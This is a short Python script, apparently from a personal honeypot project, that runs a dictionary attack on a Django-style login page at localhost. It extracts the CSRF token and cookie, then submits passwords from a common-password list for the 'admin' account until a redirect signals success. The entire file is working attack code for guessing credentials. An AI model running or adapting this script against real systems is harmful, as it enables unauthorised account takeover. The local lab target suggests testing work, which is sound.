from http.client import HTTPResponse
import sys
import requests
import re
import threading
import os

pwfoundflag = 0
def main():
    params = sys.argv
    username = "admin"
    url = "http://127.0.0.1:8000/login/"
   
    bruteforce(username=username,url=url,index=0)
    
    
    

def searchforcsrf(input):
        x = input.text
        inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
        valuelist = re.findall(r"\"[^\"]*\"",inputtag.group())
        mwt = valuelist[2]
        mwt =mwt.strip('\"')
        return mwt



def bruteforce(username,url,index):
    filez = open("C:/Users/ashti/honeypot_project/password_cracker/1000-most-common-passwords.txt","r")
    passworddict =filez.readlines()
    counter = index
    req = requests.get(url = url)
    mwt=searchforcsrf(req)
    csrftoken = req.cookies.get("csrftoken")
    parameters = {}
    global pwfoundflag
    while (counter < len(passworddict)) and pwfoundflag ==0:
        password = passworddict[counter].strip()
        print("Trying Password: "+ password)
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        submitform = requests.post(headers=headers,url=url,cookies={"csrftoken":csrftoken},data={"csrfmiddlewaretoken":mwt,"username":username,"password":password},allow_redirects=False)
        counter = counter + 1
        if submitform.status_code == 302:
            print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
            print("Password is    " + password)
            pwfoundflag = 1
            quit()
        if  len(passworddict)<counter:
            print("password not found")
main()


